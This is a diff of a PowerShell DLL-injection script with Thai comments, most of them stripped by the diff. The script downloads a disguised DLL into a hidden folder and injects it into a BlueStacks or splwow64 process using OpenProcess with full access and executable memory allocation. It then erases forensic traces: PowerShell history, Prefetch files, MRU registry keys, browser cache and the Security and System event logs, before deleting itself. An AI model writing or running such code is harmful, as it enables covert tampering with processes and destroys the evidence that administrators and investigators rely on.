@@ -1,5 +1,5 @@
 # ============================================================
-# PowerShell Injection Script (Enhanced)
+# PowerShell Injection Script (Fixed for iex)
 # ============================================================
 
 # === 1. Self-Elevate to Administrator ===
@@ -84,12 +84,10 @@ catch {
 }
 
 # === 5. สร้างโฟลเดอร์ทำงานและดาวน์โหลด DLL ===
-# สร้างโฟลเดอร์และซ่อน
 if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue }
 New-Item -ItemType Directory -Path $workDir -Force | Out-Null
 attrib +h +s $workDir
 
-# กำหนด path ของ DLL โดยใช้ $fakeName
 $dllPath = Join-Path $workDir $fakeName
 
 try {
@@ -99,7 +97,6 @@ try {
     
     if (Test-Path $dllPath) {
         Write-Host "[+] Download successful: $dllPath" -ForegroundColor Green
-        # ซ่อนไฟล์ DLL
         attrib +h $dllPath
     } else {
         throw "File not found after download."
@@ -110,7 +107,7 @@ catch {
     exit 1
 }
 
-# === 6. กำหนดเป้าหมายกระบวนการ (ลองหลายตัว) ===
+# === 6. กำหนดเป้าหมายกระบวนการ ===
 $targetProcesses = @(
     @{ Name = "HD-Player"; Path = "C:\Program Files\BlueStacks_nxt\HD-Player.exe" },
     @{ Name = "splwow64"; Path = "splwow64.exe" },
@@ -118,13 +115,11 @@ $targetProcesses = @(
 )
 
 $proc = $null
-$targetExe = $null
 $targetName = $null
 
 foreach ($t in $targetProcesses) {
     Write-Host "[+] Attempting to launch $($t.Name)..." -ForegroundColor Yellow
     try {
-        # เช็คว่ากระบวนการกำลังทำงานอยู่หรือไม่
         $existingProc = Get-Process -Name $t.Name -ErrorAction SilentlyContinue
         if ($existingProc) {
             $proc = $existingProc[0]
@@ -133,10 +128,8 @@ foreach ($t in $targetProcesses) {
             break
         }
         
-        # ถ้าไม่มี ให้ลองรัน
         $path = $t.Path
         if ($t.Name -eq "HD-Player" -and -not (Test-Path $path)) {
-            # ลองหา HD-Player ในตำแหน่งอื่น
             $possiblePaths = @(
                 "C:\Program Files\BlueStacks_nxt\HD-Player.exe",
                 "C:\Program Files\BlueStacks\HD-Player.exe",
@@ -206,7 +199,6 @@ try {
         (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))
     )
     
-    # PROCESS_ALL_ACCESS (0x001F0FFF)
     $hProcess = $OpenProcessDelegate.Invoke(0x001F0FFF, 0, $pid1)
     
     if ($hProcess -eq [IntPtr]::Zero) {
@@ -215,7 +207,6 @@ try {
     }
     Write-Host "[+] Process Handle: $hProcess" -ForegroundColor Green
     
-    # Allocate memory for the DLL path string
     $addr = $VirtualAllocExDelegate.Invoke($hProcess, [IntPtr]::Zero, 0x1000, 0x3000, 0x40)
     if ($addr -eq [IntPtr]::Zero) {
         Write-Host "[!] Failed to allocate memory" -ForegroundColor Red
@@ -253,20 +244,17 @@ catch {
 # === 8. Enhanced Cleanup & Anti-Forensics ===
 Write-Host "[+] Starting deep cleanup..." -ForegroundColor Cyan
 
-# 8.1 Clear PowerShell History
 [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() 2>$null
 $histPath = (Get-PSReadLineOption).HistorySavePath
 if (Test-Path $histPath) { 
     try { Set-Content -Path $histPath -Value "" -Force -ErrorAction SilentlyContinue } catch {}
 }
 
-# 8.2 Clear Recent Files
 $recentPath = Join-Path $env:APPDATA "Microsoft\Windows\Recent"
 if (Test-Path $recentPath) {
     Get-ChildItem -Path $recentPath -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
 }
 
-# 8.3 Clear Jump Lists
 $jumpListPaths = @(
     (Join-Path $env:APPDATA "Microsoft\Windows\Recent\AutomaticDestinations"),
     (Join-Path $env:APPDATA "Microsoft\Windows\Recent\CustomDestinations")
@@ -277,28 +265,23 @@ foreach ($path in $jumpListPaths) {
     }
 }
 
-# 8.4 Clear Prefetch (ลบไฟล์ .pf ที่เกี่ยวข้อง)
 $prefetchPath = "C:\Windows\Prefetch"
 for ($i = 0; $i -lt 3; $i++) {
     Start-Sleep -Seconds 1
     if (Test-Path $prefetchPath) {
-        # ลบ prefetch ของ HD-Player, splwow64, และ DLL
         Get-ChildItem -Path $prefetchPath -Filter "*.pf" -Force -ErrorAction SilentlyContinue | 
             Where-Object { $_.Name -like "*HD-PLAYER*" -or $_.Name -like "*SPLWOW64*" -or $_.Name -like "*MSCORIES*" } |
             Remove-Item -Force -ErrorAction SilentlyContinue
     }
 }
 
-# 8.5 Clear INetCache
 $ieCache = Join-Path $env:LOCALAPPDATA "Microsoft\Windows\INetCache"
 if (Test-Path $ieCache) {
     Get-ChildItem -Path $ieCache -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
 }
 
-# 8.6 Clear Temp Again
 Get-ChildItem -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
 
-# 8.7 Clear Registry MRU Keys และ MuiCache
 $mruKeys = @(
     "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
     "HKCU:\Software\Microsoft\Windows\ShellNoRoam\BagMRU",
@@ -308,7 +291,6 @@ $mruKeys = @(
 foreach ($key in $mruKeys) {
     if (Test-Path $key) {
         if ($key -like "*MuiCache*") {
-            # ลบค่า MuiCache ที่เกี่ยวข้องกับ $fakeName
             Get-Item -Path $key -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Property | Where-Object { $_ -like "*$fakeName*" -or $_ -like "*.tmp*" } | ForEach-Object {
                 Remove-ItemProperty -Path $key -Name $_ -Force -ErrorAction SilentlyContinue
             }
@@ -319,7 +301,6 @@ foreach ($key in $mruKeys) {
     }
 }
 
-# 8.8 Clear Event Logs
 $logNames = @("Application", "Security", "System", "Microsoft-Windows-PowerShell/Operational")
 foreach ($logName in $logNames) {
     try {
@@ -327,7 +308,6 @@ foreach ($logName in $logNames) {
     } catch {}
 }
 
-# 8.9 Delete DLL และโฟลเดอร์ทำงาน
 Start-Sleep -Seconds 2
 if (Test-Path $workDir) { 
     try { 
@@ -336,15 +316,12 @@ if (Test-Path $workDir) {
     } catch {}
 }
 
-# 8.10 Clear PowerShell History อีกครั้ง
 Clear-History -ErrorAction SilentlyContinue
 
-# 8.11 Delete script itself
 if ($PSCommandPath -and (Test-Path $PSCommandPath)) { 
     Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue 
 }
 
-# 8.12 Force GC
 [GC]::Collect()
 Start-Sleep -Seconds 2
 
